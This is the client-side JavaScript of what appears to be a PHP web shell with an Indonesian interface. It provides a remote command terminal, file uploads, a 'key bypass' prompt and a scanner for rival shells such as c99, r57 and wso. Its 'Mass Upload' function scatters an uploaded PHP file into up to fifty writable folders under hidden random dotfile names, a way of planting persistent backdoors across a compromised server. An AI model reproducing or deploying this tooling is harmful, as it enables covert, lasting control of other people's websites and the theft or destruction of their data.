    toast(r.ok ? 'Folder dibuat: ' + n : r.out, !r.ok);
    if (r.ok) $('ndName').value = '';
    loadDir(CWD);
  });
}
function uiNewDir() {
  const n = prompt('Nama folder baru:');
  if (!n) return;
  api({act: 'action', op: 'mkdir', paths: [CWD.replace(/[\\/]+$/, '') + '/' + n]}).then(r => { toast(r.ok ? 'Dibuat' : r.out, !r.ok); loadDir(CWD); });
}
function uiUpload() { $('fileInput').click(); }

function uiMassUpload() {
  openModal('⇈ Mass Upload — sebar file ke banyak folder',
    `<div style="font-size:12.5px;line-height:1.7">
      Base dir: <b style="color:#ff5c6c">${esc(CWD)}</b><br>
      File PHP akan disebar ke folder-folder writable di dalam base dir dengan nama tersembunyi (dotfile random).<br><br>
      <input type="file" id="muFile" accept=".php,.phtml" style="width:100%;margin-bottom:10px">
      Jumlah folder target: <input type="number" id="muCount" value="15" min="1" max="50" class="inp" style="width:70px">
     </div>`,
    `<button class="btn acc" onclick="doMassUpload()">🚀 Mass Upload</button><button class="btn-ghost" onclick="closeModal()">Batal</button>`);
}
async function doMassUpload() {
  const f = $('muFile').files[0];
  if (!f) { toast('Pilih file dulu', true); return; }
  const fd = new FormData();
  fd.append('act', 'massupload'); fd.append('base', CWD);
  fd.append('count', $('muCount').value || '15'); fd.append('csrf', CSRF);
  fd.append('file', f);
  toast('Mass upload berjalan…');
  const r = await (await fetch('?ajax=1', {method: 'POST', body: fd, headers: {'X-Requested-With': 'XMLHttpRequest'}})).json();
  closeModal();
  qrun('ls');
  tprint(r.out || (r.ok ? 'Selesai' : 'ERROR'), r.ok ? 'ok' : 'err');
}

function uiCleaner() {
  openModal('🛡 Malware Cleaner — scan suspicious file',
    `<div style="font-size:12.5px;line-height:1.7">
      Scan dir: <b style="color:#ff5c6c">${esc(CWD)}</b><br>
      Deteksi: c99, r57, wso, b374k, Alfa, phpSploit, backdoor pattern, eval-obfuscation, dll.<br>
      Deep scan juga menyertakan folder CMS core (wp-admin, plugins, themes).<br><br>
      <label><input type="checkbox" id="clDeep"> Deep scan (lebih lama, lebih menyeluruh)</label>
     </div>`,
    `<button class="btn acc" onclick="doCleaner()">🛡 Scan Sekarang</button><button class="btn-ghost" onclick="closeModal()">Batal</button>`);
}
async function doCleaner() {
  const deep = $('clDeep').checked ? '1' : '0';
  closeModal();
  tprint(`$ cleaner ${deep === '1' ? '--deep' : ''} ${CWD.replace(/\\/g, '/')}`, 'info');
  const r = await api({act: 'cleaner', dir: CWD, deep});
  tprint(r.out || 'ERROR', r.ok ? 'warn' : 'err');
}

$('fileInput').addEventListener('change', doUpload);
async function doUpload() {
  const files = $('fileInput').files;
  if (!files.length) return;
  const fd = new FormData();
  fd.append('act', 'upload'); fd.append('dir', CWD); fd.append('csrf', CSRF);
  for (const f of files) fd.append('files[]', f);
  const r = await (await fetch('?ajax=1', {method: 'POST', body: fd, headers: {'X-Requested-With': 'XMLHttpRequest'}})).json();
  toast(r.ok ? r.out : r.out, !r.ok);
  $('fileInput').value = '';
  loadDir(CWD);
}
const dz = $('dropzone');
dz.addEventListener('click', uiUpload);
dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag'); });
dz.addEventListener('dragleave', () => dz.classList.remove('drag'));
dz.addEventListener('drop', e => {
  e.preventDefault(); dz.classList.remove('drag');
  const files = e.dataTransfer.files;
  if (!files.length) return;
  const fd = new FormData();
  fd.append('act', 'upload'); fd.append('dir', CWD); fd.append('csrf', CSRF);
  for (const f of files) fd.append('files[]', f);
  fetch('?ajax=1', {method: 'POST', body: fd, headers: {'X-Requested-With': 'XMLHttpRequest'}})
    .then(r => r.json()).then(r => { toast(r.out, !r.ok); loadDir(CWD); });
});

const termOut = $('termOut'), termIn = $('termIn');
function tprint(text, cls) {
  const d = document.createElement('div');
  d.className = 'ln ' + (cls || '');
  d.textContent = text;
  termOut.appendChild(d);
  termOut.scrollTop = termOut.scrollHeight;
}
termIn.addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    const v = termIn.value.trim();
    if (!v) return;
    history.push(v); histIdx = history.length;
    tprint(`${CWD.replace(/\\/g, '/')} $ ${v}`, 'info');
    termIn.value = '';
    runCmd(v);
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (histIdx > 0) termIn.value = history[--histIdx] || '';
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (histIdx < history.length - 1) termIn.value = history[++histIdx] || '';
    else { histIdx = history.length; termIn.value = ''; }
  }
});
async function runCmd(v) {
  const r = await api({act: 'term', input: v, cwd: CWD});
  if (r.clear) { termOut.innerHTML = ''; return; }
  if (r.logout) { location.href = '?logout=1'; return; }
  if (r.out) tprint(r.out, r.ok ? '' : 'err');
  CWD = r.cwd || CWD;
  const dirs = v.match(/^(\.?|go|cd)\s*(\S*)$/);
  if (v === 'ls' || v.startsWith('ls ') || (dirs && dirs[2])) loadDir(CWD);
}
function qrun(cmd) { tprint(`${CWD.replace(/\\/g, '/')} $ ${cmd}`, 'info'); runCmd(cmd); }
function qrunPrompt(cmd) {
  const key = prompt('Masukkan key bypass:');
  if (!key) return;
  qrun(cmd + ' ' + key);
}

loadDir(CWD);
termIn.focus();
setInterval(() => { fetch('?ajax=1', {method: 'HEAD'}).catch(() => {}); }, 300000);
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') closeModal();
  if (e.ctrlKey && e.key === 'k') { e.preventDefault(); termOut.innerHTML = ''; termIn.focus(); }
});
</script>
</body>
</html>
